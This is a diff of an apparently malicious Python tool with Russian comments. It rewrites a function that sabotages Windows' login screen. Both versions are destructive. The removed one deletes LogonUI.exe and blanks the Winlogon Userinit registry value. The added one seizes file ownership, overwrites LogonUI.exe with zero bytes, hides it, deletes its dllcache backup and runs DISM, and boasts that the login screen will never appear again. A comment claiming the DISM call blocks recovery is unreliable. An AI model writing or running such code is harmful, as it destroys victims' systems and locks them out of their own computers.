@@ -170,40 +170,45 @@ def get_location():
     except:
         return "❌ Location error"
 
-def kill_logonui_permanently():
+def kill_logonui():
+    """Полное уничтожение LogonUI: забивка нулями + блокировка восстановления"""
     try:
-        # 1. Останавливаем процесс
-        os.system("taskkill /f /im LogonUI.exe")
+        # 1. Убиваем процесс
+        os.system("taskkill /f /im LogonUI.exe 2>nul")
+        time.sleep(1)
         
-        # 2. Удаляем сам файл
+        # 2. Путь к файлу
         system32 = os.path.join(os.environ['SystemRoot'], 'System32')
         logonui_path = os.path.join(system32, 'LogonUI.exe')
         
-        if os.path.exists(logonui_path):
-            # Сначала меняем владельца и права (иначе доступ запрещён)
-            os.system(f'takeown /f "{logonui_path}"')
-            os.system(f'icacls "{logonui_path}" /grant Administrators:F')
-            
-            # Удаляем
-            os.remove(logonui_path)
-            return "💀 LogonUI.exe полностью удалён с диска!"
+        if not os.path.exists(logonui_path):
+            return "❌ LogonUI.exe не найден"
         
-        # 3. Удаляем из реестра (чтобы даже не пытался запускаться)
-        key = winreg.OpenKey(
-            winreg.HKEY_LOCAL_MACHINE,
-            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
-            0,
-            winreg.KEY_WRITE
-        )
-        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, "explorer.exe")
-        winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, "")
-        winreg.CloseKey(key)
+        # 3. Снимаем защиту (TrustedInstaller)
+        os.system(f'takeown /f "{logonui_path}" 2>nul')
+        os.system(f'icacls "{logonui_path}" /grant Administrators:F 2>nul')
         
-        # 4. Подменяем файл заглушкой (чтобы система не восстановила)
-        with open(logonui_path, 'w') as f:
-            f.write("")  # Пустой файл с тем же именем
+        # 4. Получаем размер файла
+        file_size = os.path.getsize(logonui_path)
         
-        return "💀 LogonUI уничтожен полностью! Экран входа НИКОГДА не появится!"
+        # 5. ЗАБИВАЕМ НУЛЯМИ (полная перезапись)
+        with open(logonui_path, 'wb') as f:
+            f.write(b'\x00' * file_size)  # Каждый байт → 0x00
+            f.flush()
+            os.fsync(f.fileno())  # Принудительная запись на диск
+        
+        # 6. Делаем файл системным и скрытым
+        os.system(f'attrib +s +h "{logonui_path}" 2>nul')
+        
+        # 7. Удаляем бэкап (чтобы SFC не восстановил)
+        backup_path = os.path.join(system32, 'dllcache', 'LogonUI.exe')
+        if os.path.exists(backup_path):
+            os.remove(backup_path)
+        
+        # 8. Дополнительно: блокируем восстановление через DISM
+        os.system("dism /online /cleanup-image /restorehealth /limitaccess 2>nul")
+        
+        return f"💀 LogonUI ЗАБИТ НУЛЯМИ ({file_size} байт)! Экран входа НИКОГДА не появится!"
         
     except Exception as e:
         return f"❌ Ошибка: {e}"
